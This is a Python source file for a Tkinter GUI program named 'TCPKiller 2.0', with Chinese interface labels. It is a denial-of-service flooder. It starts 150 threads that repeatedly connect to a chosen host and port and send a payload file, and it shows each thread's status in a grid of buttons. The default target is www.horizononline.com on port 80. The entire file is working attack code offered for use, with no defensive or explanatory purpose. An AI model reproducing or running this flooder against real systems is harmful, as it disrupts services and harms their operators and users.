#coding=utf-8
import socket
import threading
import time
import sys
from tkinter import *

shouldq=0
xs=15 #x-size
ys=10 #y-size
t=1 #error-delay-time
ver='2.0' #version
inited=False

def initt():
    global inited,host,port,content
    inited=True
    host=hostvar.get()
    port=portvar.get()
    try:
        f=open('content.txt','br')
        content=f.read()
        f.close()
    except:
        content=''
    setup.destroy()

def k(y,x):
    global shouldq
    sta[y][x]['text']='＝＝'
    try:
        while shouldq==0:
            try:
                s=socket.socket()
                s.connect((host,port))
                s.send(content)
                #s.close()
            except (OSError,ConnectionRefusedError,TimeoutError):
                if shouldq==1:
                    sta[y][x]['text']='　　'
                    return
                sta[y][x]['text']='！！'
                time.sleep(t)
                sta[y][x]['text']='＝＝'
            else:
                if shouldq==1:
                    sta[y][x]['text']='　　'
                    return
                if sta[y][x]['text']=='－－':
                    sta[y][x]['text']='＋＋'
                else:
                    sta[y][x]['text']='－－'
        sta[y][x]['text']='　　'
        return
    except:
        raise################
        return

def st():
    global shouldq
    shouldq=0
    if threading.activeCount()>2:
        messagebox.showwarning('TCPKiller',
                               str(threading.activeCount()-2)+'个线程已在运行')
    for y in range(ys):
        for x in range(xs):
            t=threading.Thread(target=k,args=(y,x))
            t.setDaemon(True)
            t.start()
def kill():
    global shouldq
    shouldq=1

def test():
    try:
        s=socket.socket()
        s.connect((host,port))
        s.send(content)
        s.close()
    except (OSError,ConnectionRefusedError,TimeoutError) as e:
        messagebox.showwarning('TCPKiller',str(e)+'\n'+host+':'+str(port))
    except:
        messagebox.showerror('TCPKiller','未知错误')
        raise
    else:
        messagebox.showinfo('TCPKiller','测试成功\n'+host+':'+str(port))

def init():
    global hostvar,portvar,setup
    setup=Tk()
    
    hostvar=StringVar() #target-hostname
    hostvar.set('www.horizononline.com')
    portvar=IntVar() #target-port
    portvar.set(80)

    ipselect=Entry(setup,textvariable=hostvar)
    portselect=Entry(setup,textvariable=portvar)
    setupdone=Button(setup,text='完成(内部神通专版)',command=initt)

    setup.title('设置')
    setup.resizable(False,False)
    Label(setup,text='主机').grid(row=0,column=0)
    ipselect.grid(row=0,column=1)
    Label(setup,text='端口').grid(row=1,column=0)
    portselect.grid(row=1,column=1)
    setupdone.grid(row=2,column=0,columnspan=2)
    mainloop()


init()
global tk
tk=Tk()
if not inited:
    tk.destroy()
    sys.exit(-1)

sta=[[0 for col in range(xs)] for row in range(ys)]

for y in range(ys):
    for x in range(xs):
        sta[y][x]=Button(tk,text='　　')
        sta[y][x].grid(column=x,row=y)

bs=Button(tk,text='开始',command=st)
bs.grid(column=xs+1,row=0)
bk=Button(tk,text='停止',command=kill)
bk.grid(column=xs+1,row=1)
bk=Button(tk,text='测试',command=test)
bk.grid(column=xs+1,row=2)

tk.resizable(False,False)
tk.title('TCPKiller '+ver)

mainloop()
kill()
tk.destroy()
